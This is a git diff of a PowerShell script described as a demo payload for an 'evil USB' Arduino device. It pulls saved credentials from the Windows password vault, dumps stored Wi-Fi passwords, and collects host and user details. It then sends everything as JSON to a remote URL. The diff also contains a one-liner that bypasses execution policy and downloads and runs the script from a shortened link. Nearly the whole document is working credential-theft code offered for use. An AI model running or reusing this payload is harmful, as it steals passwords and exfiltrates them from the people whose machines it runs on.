@@ -1,6 +1,47 @@
-#powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘https://bit.ly/2El9Fyw’)"
+<#
+.SYNOPSIS
+Demo to get cached credentials, wifi and upload to webserver
+.DESCRIPTION
+Performs the following task
+    - Get credentilas from IE vault
+    - Get saved wifi passwords
+    - Get host information
+    - Upload to webserver
+            
+.NOTES
+        Author: Mattias Grondahl  Date  : October 14, 2018   
+        Demo payload for arduino configured as evil usb 
+.PARAMETERS
+    -output
+        Enter output path
+        Example: ./script.ps1 -output C:\windows\temp\out
+    -url
+        Enter url where the data will be sent as a json request
+        Example: ./script.ps1 -url http://localhost/data
+    
+.EXAMPLE 
+#Run script with parameters
+.\script.ps1 -output C:\windows\temp\out -url http://localhost/data
+#Run from github
+powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘https://bit.ly/2El9Fyw’)"
+#>
 
-function Getcred {
+[CmdletBinding()]
+Param(
+  [Parameter(Mandatory=$False,Position=1)]
+   [string]$output,
+	
+   [Parameter(Mandatory=$False,Position=2)]
+   [string]$url
+)
+
+#Suppress Errors (set to Continue to show errors on run)
+$ErrorActionPreference = "Continue"
+$Error.count
+#New-Item Errors.log -type file
+$date = (Get-Date).ToString('yyyy-MM-dd')
+
+function Getcreds {
 [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
 $vault = New-Object Windows.Security.Credentials.PasswordVault
 $vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
@@ -35,7 +76,6 @@ $profileNames | Sort-Object ProfileName | Select-Object ProfileName, SSID, Passw
 }
 
 function sysinfo {
-$date = (Get-Date) 
 $user = Whoami
 $localusers = Get-LocalUser
 $sessions = query user
@@ -53,21 +93,33 @@ $sessions
 $env:HostIP
 }
 
-function upload {
-$Url = "http://192.168.1.174/creds"
+function body {
 $Body = @{
-    cred=Getcred
+    cred=Getcreds
     wifi=Getwifi
     sysinfo=sysinfo
     users=$user
     ip=$env:HostIP
-    creds=$creds
 }
-Invoke-RestMethod -Method 'Get' -Uri $url -Body $body -OutFile output.csv
+$Body = $Body | ConvertTo-Json
+$Object = ConvertFrom-Json –InputObject $Body
 }
 
-#Getcred
-#Getwifi
-#sysinfo
-#Gethostinfo
-upload
+function upload($url) {
+
+Invoke-RestMethod -Method 'POST' -Uri $url -Body $Object
+}
+
+function log {
+$output = $output  + $date + ".log"
+Add-Content -Path $output -Value $Object
+Get-Content -Path $output | ConvertFrom-Json
+}
+
+
+###Run
+body
+log
+if ($url -ne "") {
+upload($url)
+}
